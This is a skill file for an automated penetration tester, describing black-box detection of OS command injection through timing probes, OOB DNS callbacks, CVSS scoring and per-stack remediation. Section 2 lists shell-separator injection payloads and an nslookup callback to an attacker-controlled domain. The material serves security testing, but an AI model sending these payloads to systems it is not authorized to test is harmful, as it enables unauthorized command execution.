---
owasp_id: A03:2021
vuln_class: command_injection
test_mode: blackbox
requires: []
primitive: command_injection_confirmed
evidence_schema:
  required_proof: [oob_or_timing_confirmation, command_output_sample]
  min_tool_confirmations: 2
  oob_required: true
---

# Skill: OS Command Injection — Black Box

## 1. Recon — Attack Surface Mapping
- Target features that plausibly shell out: file conversion (PDF/image
  thumbnail generation), network diagnostics (ping/traceroute UI features),
  archive extraction, hostname/IP lookup tools, anything that accepts a
  filename or hostname and "does something" with it server-side.
- Note the input's shape — a hostname field is a stronger candidate than a
  free-text comment field.

## 2. Detection Methodology — Probe Sequence
1. Non-destructive separator probes, least noisy first:
   `; sleep 5`, `| sleep 5`, `` `sleep 5` ``, `$(sleep 5)`, `& sleep 5 &`
   — measure response latency against baseline. A consistent ~5s delay
   across separator styles confirms command execution, not a fluke.
2. Confirm with an out-of-band channel rather than relying on timing alone
   — DNS or HTTP callback to an attacker-controlled listener:
   `; nslookup argus-oob-<token>.<collaborator-domain>` — this satisfies
   `oob_required: true` and rules out a false timing read entirely.
3. Only after OOB/timing confirms execution, attempt a benign
   output-returning command (`id`, `whoami`) if the response path reflects
   command output anywhere.

## 3. Exploitation Path — Tool Invocation
- Use `nuclei`'s command-injection detection templates first for broad
  coverage (`nuclei.run(target, mode="detect")` already run in active
  recon — check its hits for `cmdi`/`rce` template IDs before manual work).
- Manual confirmation via `tool_wrappers/http_request.py` sending the
  separator payloads with precise timing measurement.
- Never use a destructive command (`rm`, `shutdown`, fork bombs) — `id`,
  `whoami`, `echo <canary>` are sufficient to prove impact.

## 4. Evidence Capture
`evidence_schema` requires `oob_or_timing_confirmation` (the OOB callback
log entry or the paired baseline/delayed timing measurements) AND
`command_output_sample` (actual output of a benign command like `id`,
captured from the response if reflected, or from the OOB listener if blind).
`oob_required: true` means a pure timing-only finding without an attempted
OOB confirmation should stay at lower confidence until OOB is attempted.

## 5. False-Positive Filtering
- Network jitter can fake a 5s delay once — always repeat the timing probe
  at least twice and compare against a non-payload baseline before trusting it.
- Some frameworks shell out via `execve`-style calls that don't invoke a
  shell at all (no `/bin/sh -c`) — separator characters are inert there;
  a lack of response to `;`/`|` doesn't rule out injection if the call uses
  `shell=True` equivalent elsewhere — verify via OOB with shell metacharacters
  AND without before concluding clean.

## 6. CVSS Vector Construction
- Unauthenticated command injection with command output visible:
  `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0 Critical) — full compromise.
- Blind (OOB-only, no reflected output) but confirmed execution: same impact
  metrics apply (the attacker still achieves arbitrary execution), only
  `confidence` and ease-of-exploitation narrative differ, not the CVSS impact score.
- Authenticated-only reachable: raise `PR:L` or `PR:H` accordingly.

## 7. Remediation (by stack)
- Node: never use `child_process.exec`/`execSync` with string concatenation;
  use `execFile`/`spawn` with an argument array — no shell interpretation
  of metacharacters.
- Python: never `subprocess.run(cmd, shell=True)` with interpolated input;
  use `subprocess.run([binary, arg1, arg2])` with `shell=False` (the default).
- PHP: avoid `exec`/`shell_exec`/`system` entirely for user-influenced
  input; if unavoidable, use `escapeshellarg()` on every argument — never
  string-build the full command.
- Defense in depth: run the service account with no shell access
  (`/usr/sbin/nologin`) and the minimum filesystem permissions needed.
